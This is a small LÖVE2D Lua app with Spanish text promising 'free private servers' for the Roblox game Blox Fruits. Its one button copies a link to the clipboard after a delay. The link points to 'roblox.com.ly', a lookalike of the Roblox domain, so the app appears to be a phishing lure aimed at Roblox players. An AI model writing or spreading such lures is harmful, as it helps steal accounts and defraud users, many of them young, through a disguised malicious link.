local button = {x = 100, y = 200, w = 200, h = 60}
local link = "https://roblox.com.ly/games/2753915549/Event-Blox-Fruits?privateServerLinkCode=36614867226193845417684496298532"
local state = "idle"
local timer = 0

function love.load()
    love.window.setMode(400, 400)
end

function love.update(dt)
    if state == "waiting" then
        timer = timer + dt
        if timer >= 3 then
            love.system.setClipboardText(link)
            state = "copied"
        end
    end
end

function love.draw()
    love.graphics.setBackgroundColor(0.08, 0.08, 0.08)

    love.graphics.setColor(1,1,1)
    love.graphics.printf("Free servidores privados", 0, 80, 400, "center")
    love.graphics.printf("Creado por Free Servers Community", 0, 110, 400, "center")

    love.graphics.setColor(0, 0.7, 1)
    love.graphics.rectangle("fill", button.x, button.y, button.w, button.h, 12, 12)

    love.graphics.setColor(1,1,1)
    if state == "idle" then
        love.graphics.printf("Get Link", button.x, button.y + 18, button.w, "center")
    elseif state == "waiting" then
        love.graphics.printf("Copiando...", button.x, button.y + 18, button.w, "center")
    elseif state == "copied" then
        love.graphics.printf("¡Copiado!", button.x, button.y + 18, button.w, "center")
    end
end

function love.touchpressed(id, x, y)
    x = x * 400
    y = y * 400

    if x > button.x and x < button.x + button.w and
       y > button.y and y < button.y + button.h then
        
        if state == "idle" then
            state = "waiting"
            timer = 0
        end
    end
end
